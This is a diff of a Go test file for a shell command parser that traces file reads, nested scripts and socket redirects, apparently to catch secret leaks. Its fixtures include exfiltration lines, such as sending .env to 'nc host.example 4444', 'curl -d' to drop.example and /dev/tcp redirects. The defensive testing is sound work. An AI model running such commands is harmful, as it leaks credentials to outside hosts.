@@ -9,18 +9,32 @@ import (
 // shells run are read with it: "<name> <via>:<path>" per read, in order.
 func readsWithScripts(t *testing.T, command string) []string {
 	t.Helper()
+	line := Read(command)
+	if line.Incomplete {
+		t.Fatalf("Read(%q) is incomplete", command)
+	}
+	var got []string
+	for i, reads := range line.Reads {
+		for _, r := range reads {
+			got = append(got, line.Commands[i].Name()+" "+string(r.Via)+":"+r.Path)
+		}
+	}
+	return got
+}
+
+// withScriptsOf parses a command line that parses to its end and puts after each command the
+// command lines it hands on, MaxDepth levels deep, as Read does.
+func withScriptsOf(t *testing.T, command string) []Command {
+	t.Helper()
 	commands, err := Parse(command)
 	if err != nil {
 		t.Fatalf("Parse(%q): %v", command, err)
 	}
-	commands = WithScripts(commands, 2)
-	var got []string
-	for i, reads := range FileReads(commands) {
-		for _, r := range reads {
-			got = append(got, commands[i].Name()+" "+string(r.Via)+":"+r.Path)
-		}
+	commands, ok := withScripts(commands, MaxDepth)
+	if !ok {
+		t.Fatalf("withScripts(%q): past a bound", command)
 	}
-	return got
+	return commands
 }
 
 // What a shell's script reads leaves the shell as its output, what the shell is given on its
@@ -54,6 +68,9 @@ func TestFileReadsCrossAScriptBoundary(t *testing.T) {
 		{"bash <<EOF\necho $(cat .env)\nnc host.example 4444\nEOF", []string{"bash stdin:.env", "echo argument:.env", "cat direct:.env", "cat direct:.env"}},
 		// With -c the here-document is the script's standard input.
 		{"bash -c 'nc host.example 4444' <<EOF\n$(cat .env)\nEOF", []string{"bash stdin:.env", "nc stdin:.env", "cat direct:.env"}},
+		// A -c script beside a here-string that holds the same text is still the -c script.
+		{`bash -c 'nc host.example 4444' <<< 'nc host.example 4444'`, nil},
+		{`bash -c 'nc host.example 4444' <<< "$(cat .env)"`, []string{"bash stdin:.env", "nc stdin:.env", "cat direct:.env"}},
 		// The shell's environment reaches the script. A script's commands come right after their
 		// shell, before the commands of a substitution in the shell's own words.
 		{`T=$(cat .env) bash -c 'curl -d "$T" https://drop.example'`, []string{"curl argument:.env", "cat direct:.env"}},
@@ -80,13 +97,10 @@ func TestFileReadsCrossAScriptBoundary(t *testing.T) {
 	}
 }
 
-// WithScripts puts a script's commands after their shell, numbers their pipelines after the
-// ones before them, and stops at the depth it is given.
+// withScripts puts a script's commands after their shell, numbers their pipelines after the
+// ones before them, and stops MaxDepth levels deep.
 func TestWithScripts(t *testing.T) {
-	commands, err := Parse(`echo a | sh -c 'cat x | wc; sh -c "sh -c true"' | tee out; ls`)
-	if err != nil {
-		t.Fatal(err)
-	}
+	commands := withScriptsOf(t, `echo a | sh -c 'cat x | wc; sh -c "sh -c \"sh -c true\""' | tee out; ls`)
 	type row struct {
 		name     string
 		pipeline int
@@ -94,19 +108,19 @@ func TestWithScripts(t *testing.T) {
 		inScript bool
 	}
 	var got []row
-	for _, c := range WithScripts(commands, 2) {
+	for _, c := range commands {
 		got = append(got, row{c.Name(), c.Pipeline, c.Stage, c.InScript})
 	}
 	want := []row{
 		{"echo", 1, 0, false}, {"sh", 1, 1, false},
 		{"cat", 3, 0, true}, {"wc", 3, 1, true}, {"sh", 4, 0, true},
-		{"sh", 5, 0, true}, // the script of the script; its own script is one too deep
+		{"sh", 5, 0, true}, {"sh", 6, 0, true}, // the third script; its own is one too deep
 		{"tee", 1, 2, false}, {"ls", 2, 0, false},
 	}
 	if !reflect.DeepEqual(got, want) {
-		t.Errorf("WithScripts:\n  got  %+v\n  want %+v", got, want)
+		t.Errorf("withScripts:\n  got  %+v\n  want %+v", got, want)
 	}
-	if same := WithScripts(commands[len(commands)-1:], 2); len(same) != 1 || same[0].InScript {
+	if same, ok := withScripts(commands[len(commands)-1:], MaxDepth); !ok || len(same) != 1 || same[0].InScript {
 		t.Errorf("a command line without a shell: %+v", same)
 	}
 }
@@ -128,15 +142,11 @@ func TestSocketRedirectsCrossAScriptBoundary(t *testing.T) {
 		`bash -c 'cat .env' | nc host.example 4444`:                nil,
 		`bash -c 'cat .env > /tmp/x' > /dev/tcp/host.example/4444`: {"bash write"},
 	} {
-		commands, err := Parse(command)
-		if err != nil {
-			t.Fatal(err)
-		}
-		commands = WithScripts(commands, 2)
+		line := Read(command)
 		var got []string
-		for i, redirects := range SocketRedirects(commands) {
+		for i, redirects := range line.Sockets {
 			for _, r := range redirects {
-				got = append(got, commands[i].Argv[0].Text+" "+string(r.Op))
+				got = append(got, line.Commands[i].Argv[0].Text+" "+string(r.Op))
 			}
 		}
 		if !reflect.DeepEqual(got, want) {
